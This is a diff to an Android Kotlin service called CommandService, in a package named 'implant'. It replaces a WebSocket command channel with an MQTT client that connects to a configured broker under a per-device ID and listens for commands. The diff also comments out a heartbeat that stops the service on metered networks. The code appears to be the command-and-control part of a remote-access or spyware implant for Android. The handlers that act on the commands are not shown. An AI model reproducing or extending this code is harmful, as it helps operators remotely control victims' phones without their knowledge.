@@ -6,18 +6,16 @@ import android.content.Intent
 import android.os.Handler
 import android.os.IBinder
 import android.util.Log
-import com.cooperthecoder.implant.App
 import com.cooperthecoder.implant.Config
 import com.cooperthecoder.implant.Networking
-import okhttp3.Request
-import okhttp3.WebSocket
+import com.cooperthecoder.implant.data.DeviceProperties
+import org.eclipse.paho.android.service.MqttAndroidClient
 import java.util.concurrent.TimeUnit
 
 class CommandService : Service() {
 
     companion object {
         val TAG: String = CommandService::class.java.name
-        const val SOCKET_CLOSE = 1000
         val HEARTBEAT_INTERVAL = TimeUnit.SECONDS.toMillis(10)
 
         fun intent(context: Context): Intent {
@@ -27,12 +25,14 @@ class CommandService : Service() {
     }
 
 
-    private var webSocket: WebSocket? = null
-    val commandListener = CommandListener(this)
+    val client: MqttAndroidClient by lazy {
+        val clientId = DeviceProperties.deviceId(this)
+        MqttAndroidClient(applicationContext, Config.MQTT_BROKER, clientId)
+    }
 
-    lateinit var mainHandler: Handler
+    val mainHandler = Handler()
 
-    val checkMeteredTask: Runnable = Runnable {
+    val heartbeatTask: Runnable = Runnable {
         if (Networking.isMeteredNetwork(this@CommandService)) {
             Log.d(TAG, "Metered network detected.")
             this@CommandService.onMeteredConnection()
@@ -47,12 +47,8 @@ class CommandService : Service() {
     }
 
     override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
-        if (!commandListener.isRunning()) {
-            Log.d(TAG, "Opening websocket")
-            openCommandChannel()
-        } else {
-            Log.d(TAG, "Websocket connection already open.")
-        }
+        Log.d(TAG, "Connecting to MQTT broker")
+        openCommandChannel()
         return START_NOT_STICKY
     }
 
@@ -63,28 +59,25 @@ class CommandService : Service() {
     }
 
     private fun openCommandChannel() {
-        val request = Request.Builder()
-                .url(Config.WEBSOCKETS_ENDPOINT)
-                .build()
-
-        webSocket = (application as App).httpClient.newWebSocket(request, commandListener)
-        mainHandler = Handler()
+        val commandMqttConnectionListener = CommandConnectionListener(client)
+        val commandMqttCallback = CommandMessageCallback(client, applicationContext)
+        client.setCallback(commandMqttCallback)
+        client.connect(null, commandMqttConnectionListener)
         heartbeat()
-
     }
 
     private fun heartbeat() {
-        mainHandler.postDelayed(checkMeteredTask, HEARTBEAT_INTERVAL)
+        // mainHandler.postDelayed(heartbeatTask, HEARTBEAT_INTERVAL)
     }
 
 
     private fun closeCommandChannel() {
-        webSocket?.close(SOCKET_CLOSE, null)
+        client.close()
     }
 
     private fun onMeteredConnection() {
         Log.d(TAG, "Network is metered. Stopping CommandService.")
-        mainHandler.removeCallbacks(checkMeteredTask)
+        mainHandler.removeCallbacks(heartbeatTask)
         stopSelf()
     }
 }
